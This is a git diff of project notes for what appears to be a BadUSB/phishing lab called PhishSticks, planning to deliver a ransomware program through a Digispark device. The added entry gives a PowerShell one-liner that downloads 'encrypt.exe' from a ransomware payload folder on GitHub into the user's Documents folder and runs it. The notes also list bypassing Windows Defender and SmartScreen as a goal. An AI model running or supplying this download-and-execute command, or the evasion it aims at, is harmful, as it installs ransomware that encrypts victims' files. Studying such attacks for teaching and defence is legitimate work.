@@ -81,3 +81,11 @@ TO DO:
 - Setup digispark with [sawulohi's](https://github.com/therealhalonen/PhishSticks/blob/master/notes/ollikainen/notes.md#digispark) digispark tutorial - Done
 - bypass windows defender/smart screen
 - deploy the encrypt.exe with Digispark, something like [SaturnsVoid](https://github.com/SaturnsVoid/Digispark-Payload-Downloader) has done.
+
+### 10.10.2023
+
+Powershell command to download the exe to users Documents folder and start it after downloading has finished:
+```Powershell
+Invoke-WebRequest -OutFile "$env:UserProfile\Documents\test.exe" -Uri "https://github.com/therealhalonen/PhishSticks/raw/master/payloads/ransomware/ransom_app/encrypt.exe";Start-Process $env:UserProfile/Documents/test.exe -WorkingDirectory $env:UserProfile/Documents
+```
+Next thing to do is to make Digispark execute the above command
